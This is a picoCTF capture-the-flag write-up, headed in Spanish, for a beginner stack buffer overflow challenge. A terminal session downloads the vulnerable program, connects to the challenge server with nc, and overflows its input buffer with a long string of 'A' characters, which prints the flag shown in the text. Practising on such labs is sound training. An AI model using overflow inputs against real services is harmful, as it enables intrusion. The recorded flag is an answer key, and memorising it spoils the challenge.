## buffer overflow 0

# objetivo
- Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/520/vuln). You can view source [here](https://artifacts.picoctf.net/c/520/vuln.c). And connect with it using: `nc saturn.picoctf.net 53935`

---

# Hints
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

# solucion
``` bash 
(kali㉿kali)-[~]
└─$ mkdir binary
                                                         
┌──(kali㉿kali)-[~]
└─$ cd binary   
                                                         
┌──(kali㉿kali)-[~/binary]
└─$ wget https://artifacts.picoctf.net/c/520/vuln
--2022-11-25 11:52:11--  https://artifacts.picoctf.net/c/520/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 65.9.149.57, 65.9.149.85, 65.9.149.62, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|65.9.149.57|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln           100%  15.64K  --.-KB/s    in 0.02s       

2022-11-25 11:52:11 (844 KB/s) - ‘vuln’ saved [16016/16016]

(kali㉿kali)-[~/binary]
└─$ wget https://artifacts.picoctf.net/c/520/vuln.c
--2022-11-25 11:55:00--  https://artifacts.picoctf.net/c/520/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 65.9.149.57, 65.9.149.62, 65.9.149.85, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|65.9.149.57|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c         100%     808  --.-KB/s    in 0s          

2022-11-25 11:55:01 (7.99 MB/s) - ‘vuln.c’ saved [808/808]

                                                         
┌──(kali㉿kali)-[~/binary]
└─$ nc saturn.picoctf.net 53935
Input: ataaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                                                         
┌──(kali㉿kali)-[~/binary]
└─$ nc saturn.picoctf.net 53935
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}

```
# bandera
- picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}